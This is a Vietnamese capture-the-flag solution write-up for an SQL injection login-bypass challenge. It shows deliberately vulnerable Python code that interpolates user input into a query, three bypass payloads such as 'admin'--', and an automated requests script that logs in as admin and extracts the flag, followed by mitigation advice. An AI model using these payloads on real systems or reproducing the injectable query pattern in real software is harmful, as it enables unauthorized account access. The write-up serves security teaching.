# Thử thách 21: SQLiLogin — Giải pháp

## Loại lỗ hổng
**SQL Injection (SQLi) - Bypass đăng nhập kinh điển**

## Mô tả
Form đăng nhập này nối trực tiếp chuỗi thông tin người dùng (f-string trong Python) vào trong câu lệnh SQL mà không hề làm sạch (sanitize). Hacker có thể chèn các ký tự điều khiển SQL (như dấu ngoặc đơn `'` và ký hiệu bình luận `--`) để thay đổi luồng xử lý của truy vấn và đăng nhập vào tài khoản Admin một cách dễ dàng.

## Mã nguồn chứa lỗ hổng
```python
# app.py — login route
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
conn.execute(query)
user = c.fetchone()
```

## Khai thác (Exploit)

### Phương pháp 1: Comment (Bình luận) mật khẩu
Tại ô Username, nhập:
```text
admin'--
```
Ô Password nhập bất kỳ (ví dụ `x`).
Câu lệnh SQL thực thi sẽ là:
```sql
SELECT * FROM users WHERE username='admin'--' AND password='x'
```
Lúc này, ký tự `--` sẽ chú thích bỏ toàn bộ đoạn check mật khẩu phía sau. Bạn sẽ đăng nhập thành công vào tài khoản `admin`.

### Phương pháp 2: Bypass bằng mệnh đề OR
Tại ô Username và Password, nhập:
```text
' OR '1'='1
```
Câu lệnh SQL thực thi sẽ là:
```sql
SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1'
```
Mệnh đề `1=1` luôn đúng (True), nên SQL sẽ trả về toàn bộ danh sách users. Hàm `fetchone()` trong backend sẽ bốc lấy dòng đầu tiên của kết quả (thường luôn là tài khoản admin với ID=1), cấp cho bạn quyền Admin.

### Phương pháp 3: Target trực tiếp một account bằng OR
```text
Username: ' OR username='admin'--
```

## Khai thác tự động bằng Script Python
```python
import requests
import re

TARGET = "http://<host>:5000"
s = requests.Session()

# Bypass login
r = s.post(f"{TARGET}/login", data={
    "username": "admin'--",
    "password": "x"
})

# Lấy flag từ trang dashboard
r = s.get(f"{TARGET}/dashboard")

if "FCTF{" in r.text:
    flag = re.search(r"FCTF\{[^}]+\}", r.text).group()
    print(f"[+] Flag: {flag}")
else:
    print("[-] Thất bại — hãy kiểm tra lại thông tin")
```

## Flag (Chỉ minh họa)
*(Flag thực tế nằm trên trang Dashboard của hệ thống sau khi đăng nhập).*

## Bài học rút ra (Mitigation)
- **Không bao giờ** nội suy/nối trực tiếp chuỗi do user nhập vào SQL Query.
- Luôn sử dụng Parameterized Queries hoặc Prepared Statements:
  ```python
  # AFTER (An toàn)
  c.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password))
  ```
- Sử dụng công cụ Object Relational Mapping (ORM) như SQLAlchemy.
- Không lưu mật khẩu dạng plaintext (văn bản thuần thô), hãy sử dụng băm mật khẩu có muối (như bcrypt, Argon2).
- Áp dụng nguyên tắc Đặc quyền tối thiểu (Principle of Least Privilege) cho kết nối Database (Tài khoản kết nối Web chỉ nên có quyền SELECT/UPDATE, cấm DROP/ALTER).
